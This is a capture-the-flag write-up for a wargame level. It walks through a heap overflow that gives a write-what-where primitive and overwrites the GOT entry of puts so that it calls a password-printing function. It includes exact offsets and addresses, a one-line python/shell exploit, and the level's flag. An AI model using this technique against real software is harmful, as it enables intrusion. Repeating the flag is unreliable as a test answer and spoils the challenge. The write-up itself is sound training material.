# Level 7

**Vulnerability:** Heap overflow giving a write-what-where primitive → GOT overwrite.

## Walkthrough

`main` builds two objects on the heap, each `{tag, pointer-to-buffer}`, then does:

```
strcpy(obj1->buf, argv[1]);   // unbounded
strcpy(obj2->buf, argv[2]);
```

It also reads the level8 password into the global `c`, but only prints `~~`. The
function `m()` at `0x080484f4` prints `c` with `printf("%s - %d", &c, ...)`.

Overflowing `obj1->buf` (via `argv[1]`) reaches into obj2 and lets us overwrite
`obj2->buf` with any address. Then `strcpy(obj2->buf, argv[2])` writes `argv[2]`
to that address — a full write-what-where.

Distance to `obj2`'s pointer: `8 (buf) + 8 (chunk3 header) + 4 (tag) = 20` bytes.

Plan: overwrite `obj2->buf` with the GOT entry of `puts` (`0x08049928`), and set
`argv[2]` to the address of `m` (`0x080484f4`). When `main` later calls `puts("~~")`,
it calls `m()` instead, printing the password.

## Exploit

```sh
./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```

**Flag:** `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
